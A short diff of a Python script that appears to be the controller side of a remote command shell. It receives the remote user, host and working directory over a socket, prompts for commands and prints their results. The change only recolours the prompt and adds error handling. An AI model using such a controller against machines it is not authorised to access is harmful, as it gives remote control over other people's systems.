@@ -33,7 +33,7 @@ cwd, username, hostname = message.split(SEPARATOR)
 print("[+] Current working directory:", cwd)
 
 while True:
-    prompt = f"{bcolors.bold}{bcolors.green}{username}@{hostname}{bcolors.white}:{bcolors.blue}{cwd}{bcolors.white}{bcolors.reset}$"
+    prompt = f"{bcolors.bold}{bcolors.cyan}//dev-{bcolors.green}{username}@{hostname}{bcolors.white}:{bcolors.blue}{cwd}{bcolors.white}{bcolors.reset}$"
     command = input(prompt)
     if not command.strip():
         continue
@@ -41,6 +41,8 @@ while True:
     if command.lower() == "exit":
         break
     output = client_socket.recv(BUFFER_SIZE).decode()
-    results, cwd = output.split(SEPARATOR)
-
+    try:
+        results, cwd = output.split(SEPARATOR)
+    except:
+        results = output
     print(results)
